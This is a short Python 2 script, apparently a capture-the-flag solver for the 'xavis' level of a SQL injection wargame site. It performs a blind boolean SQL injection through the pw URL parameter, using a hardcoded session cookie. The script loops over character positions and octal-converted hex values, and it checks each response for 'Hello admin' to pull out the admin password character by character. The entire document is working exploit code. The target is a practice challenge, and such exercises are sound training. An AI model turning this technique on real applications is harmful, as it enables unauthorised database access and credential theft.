#!/usr/bin/python
#coding: latin-1
import requests
import re

cookie = {'PHPSESSID': '12heg85jk4qq0q2m52cshrhbk5'}

url = "https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw=-1'"

cmp = "Hello admin"

dbname=""

#Password is
for i in range(1, 41):
    for j in range(240, 373):
        query = url + " or (id='admin' and conv(hex(substr(pw," + str(i) + ",1)),16, 8) = '" + str(j) + "')-- -"
        req = requests.get(query, cookies=cookie)
        res=req.text
        tmp = re.findall(cmp, res)
        if tmp:
            str1 = chr(int(str(j),8))
            str1 = str1.encode("hex")
            dbname += str1
            break
print "Hexacode is : 0x" + dbname
